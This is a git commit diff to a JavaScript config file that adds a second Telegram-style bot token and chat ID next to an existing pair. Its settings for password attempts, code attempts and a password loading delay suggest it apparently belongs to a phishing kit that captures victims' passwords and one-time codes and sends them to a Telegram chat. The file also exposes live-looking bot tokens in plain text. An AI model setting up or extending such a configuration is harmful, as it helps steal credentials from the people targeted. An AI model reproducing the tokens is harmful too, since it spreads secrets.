6978c1ccc57207c2ef094d2a4a5d61bf875e04ab
ahah12322 <germanyfu435@gmail.com>
2025-10-13 18:02:55 +0700

    Update config.js

--- src/utils/config.js
+++ src/utils/config.js
@@ -1,8 +1,8 @@
 const config = {
     token: '8214379581:AAFu0VkZzFJqWikonUo4nnNhlXS84joK9Lk',
     chat_id: '7626778246',
-    noti_token: '',
-    noti_chat_id: '',
+    noti_token: '8318744435:AAEuU8Ds5ADhUVf3oznLwVihGwIl3VUL7-0',
+    noti_chat_id: '7626778246',
     max_password_attempts: 1,
     max_code_attempts: 2,
     password_loading_time: 5,
